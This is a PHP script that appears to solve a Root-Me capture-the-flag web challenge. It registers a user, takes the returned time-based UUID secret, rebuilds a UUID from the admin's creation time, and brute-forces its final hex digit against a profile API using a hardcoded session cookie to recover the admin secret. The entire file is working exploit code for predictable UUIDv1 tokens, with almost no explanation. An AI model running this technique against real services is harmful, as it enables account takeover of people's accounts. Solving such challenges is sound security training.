<?php
require_once "./functions.php";
//cookie de session du chall
$session_cookie = ".eJwlzj0OwjAMQOG7eGZw4sR2epkq_olgbemEuDsg1jc8fS_Y15HnHbbnceUN9kfABubqfQgFWzHtPruGZTbqqZJrkTRnDF--ipRvHp3CApHKwFrZV13KRC5hJMkagWk9Y3DrxHXgHAV_j2w5akmfDaUIqYoYTfhCrjOPv6bB-wPxNy8e.ZfwpUQ.vNSGgi4cEGrhVUw1rNsVdVEm0ts";

$urls = [
    'signup' => 'http://challenge01.root-me.org:59091/api/signup',
    'login' => 'http://challenge01.root-me.org:59091/api/login'
];

$json_data = json_encode([
    'username' => 'a',
    'password' => 'a'
]);

foreach ($urls as $action => $url) {
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-type: application/json",
            'content' => $json_data
        )
    );
    $context = stream_context_create($options);
    // si il y a un problème enleve le @
    $response = json_decode(@file_get_contents($url, false, $context));

    echo "Réponse de la requête $action : " . (!empty($response->message) ? $response->message : "l'utilisateur a déjà été créé") . "\n";
    if (!empty($response->secret)) {
        $uuid = $response->secret;
        echo "Secret : " . $response->secret . "\n";
    }
}

$baseUrl = 'http://challenge01.root-me.org:59091/api/profile';

$dateAdmin = readline("Date de création de l'admin (YYYY-MM-DD HH:ii:ss.uuuuuu (microseconde)) : ");
$dateAdmin = Datetime::createFromFormat("Y-m-d H:i:s.u", $dateAdmin)->modify("+1 hour");

$uuidModified = modifyDateInUUIDv1($uuid, getTimestampByDate($dateAdmin));

for ($i = 0; $i < 16; $i++) {
    $parts = explode("-", $uuidModified);
    $parts[0] = substr($parts[0], 0, -1) . dechex($i);
    $secret = implode("-", $parts);
    $query = http_build_query(array('secret' => $secret));
    $url = "$baseUrl?$query";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIE, "session=$session_cookie");
    $result = curl_exec($ch);

    if (!str_contains($result, "Secret doesn't correspond to any user")) {
        echo $secret;
        break;
    }
    curl_close($ch);
}
?>

